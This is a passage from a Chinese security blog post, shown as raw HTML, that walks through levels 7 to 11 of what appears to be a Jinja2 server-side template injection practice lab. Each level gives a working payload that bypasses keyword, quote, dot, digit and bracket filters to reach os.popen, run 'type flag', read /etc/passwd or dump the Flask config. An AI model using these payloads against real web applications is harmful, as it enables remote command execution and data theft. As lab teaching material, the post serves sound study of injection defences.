operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>globals<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'dHlwZSBmbGFn'</span>.decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">))</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
单双引号内的内容都能被编码。
### Level-7
过滤了`.`，可以使用`[]`绕过。
> python语法除了可以使用点 .来访问对象属性外,还可以使用中括号[].同样也可以使用__getitem__

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__class__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__base__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subclasses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__init__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
### Level-8
> bl["class", "arg", "form", "value", "data", "request", "init", "global", "open", "mro", "base", "attr"]

关键字过滤，最简单的办法就是字符串拼接，比如`'class'`可以写成`'cla''ss'`
**其他方法**
1. 编码
2. 在jinjia2语法中`~`可以进行连接，比如：`&#123;%set a="__cla"%&#125;&#123;%set aa="ss__%&#125;&#123;&#123;a~aa&#125;&#125;</code><br>3. 使用join过滤器.例如使用<code>&#123;%set a=dict(__cla=a,ss__=a)|join%&#125;&#123;&#123;a&#125;&#125;</code>,会将<code>__cla</code>和<code>ss__</code>拼接在一起,或者<code>&#123;%set a=['__cla','ss__']|join%&#125;&#123;&#123;a&#125;&#125;</code><br>4. 使用<code>reverse</code>过滤器.如<code>&#123;%set a="__ssalc__"|reverse%&#125;&#123;&#123;a&#125;&#125;</code><br>5. 使用<code>replace</code>过滤器.如<code>&#123;%set a="__claee__"|replace("ee","ss")%&#125;&#123;&#123;a&#125;&#125;</code><br>6. 使用python中的<code>char()</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> <span class="token assign-left variable">chr</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__bases__.__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span>.__init__.__globals__.__builtins__.chr %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__bases__.__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>.pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">119</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">))</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<h3 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h3><p>过滤数字，也就是说<code>__subclasses__()[139]</code>中的139要想办法绕过，使用其他代替。<br>可以使用过滤器<code>|length</code>来绕过。使用该过滤器构造139<br><code>&#123;%set a='aaaaaaaaaaaa'|length*'aaaaaaaaaaa'|length+'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;</code><br><code>139=12*11+7</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20220110145820.png" loading="lazy"><br>所以最后的payload只需要将第一关的payload中的数字给替换成a即可。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> <span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token string">'aaaaaaaaaaaa'</span><span class="token operator">|</span>length*<span class="token string">'aaaaaaaaaaa'</span><span class="token operator">|</span>length+<span class="token string">'aaaaaaa'</span><span class="token operator">|</span>length %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110150512.png" loading="lazy"></p>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><blockquote>
<p>set config = None</p>
</blockquote>
<p>一般在ssti中显示config的语法就是直接<code>&#123;&#123;config&#125;&#125;/&#123;&#123;self&#125;&#125;</code><br>这里被ban掉了。所以要找其他方式bypass，<a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/appcontext.html">http://docs.jinkan.org/docs/flask/appcontext.html</a><br>还有一个变量，可以用。<code>current_app</code></p>
<blockquote>
<p>应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for.__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span>.config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>get_flashed_messages.__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span>.config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110153731.png" loading="lazy"></p>
<h3 id="Level-11"><a href="#Level-11" class="headerlink" title="Level-11"></a>Level-11</h3><blockquote>
<p>bl[‘&#39;‘, ‘“‘, ‘+’, ‘request’, ‘.’, ‘[‘, ‘]’]</p>
</blockquote>
<p>需要绕过的点是：<code>&#39; &quot; + </code>，从前面几关可以知道，过滤了单双引号的话，可以用<code>request.args</code>来绕过，然后<code>request</code>也被过滤掉了；还有<code>.</code>被过滤，可以使用<code>[]</code>来绕过，但是<code>[]</code>也被过滤。<code>[]</code>可以使用<code>__getitem__</code>绕过，<code>.</code>还能使用过滤器<code>attr</code>绕过。所以现在的问题就是怎么绕过单双引号。</p>
<p>在没有使用到引号的前提下成功执行，就是过滤器：<code>dict()|join</code>，<br><code>&#123;% set a=dict(__cla=a,ss__=b)|join%&#125;&#123;&#123;()|attr(a)&#125;&#125;</code></p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110161207.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token operator">|</span>select<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token punctuation">(</span><span class="token punctuation">))</span> %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span>string<span class="token punctuation">(</span><span class="token punctuation">))</span> %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span>app.__doc__<span class="token operator">|</span>string<span class="token punctuation">)</span> %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p>上述构造是固定的，可以发现这几条payload回显的内容是由可打印字符的。</p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110161515.png" loading="lazy"></p>
<p>还有百分号<code>%</code>，假如百分号也被过滤掉，那么可以使用这个办法来构造出<code>%</code><br><code>&#123;% set org = self|string|urlencode|list %&#125;&#123;&#123;org[0]&#125;&#125;</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20220110161829.png" loading="lazy"><br>所以可以构造payload如下：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">a</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__cla<span class="token operator">=</span>a,ss__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __class__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">b</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__bas<span class="token operator">=</span>a,e__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __base__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">c</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__subcla<span class="token operator">=</span>a,sses__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __subclasses__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">d</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__ge<span class="token operator">=</span>a,titem__<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span><span class="token comment"># __getitem__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">e</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__in<span class="token operator">=</span>a,it__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __init__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">f</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__glo<span class="token operator">=</span>a,bals__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __globals__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">g</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>pop<span class="token operator">=</span>a,en<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># popen</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">h</span><span class="token operator">=</span>self<span class="token operator">|</span>string<span class="token operator">|</span>attr<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>%<span class="token punctuation">&#125;</span><span class="token comment"># 空格</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token punctuation">(</span>dict<span class="token punctuation">(</span>type<span class="token operator">=</span>abc<span class="token punctuation">)</span><span class="token operator">|</span>join,h,dict<span class="token punctuation">(</span>flag<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span><span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span><span class="token comment"># type flag</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">j</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>read<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span><span class="token comment"># read</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># 拼接</span></code></pre>
<p>结果<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220110164037.png" loading="lazy"></p>
<h2 id="结"><a href="#结" class="headerlink" title="结"></a>结</h2><p>剩下的暂时不想写了，先mark了。回头再看。</p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/39874e07/" title="Python的SSTI模版注入及沙盒逃逸">https://m0re.top/posts/39874e07/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/f8f6e3f5/" rel="next" title="【Java学习笔记】0x01"><span class="post-nav-text">【Java学习笔记】0x01</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/39874e07/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>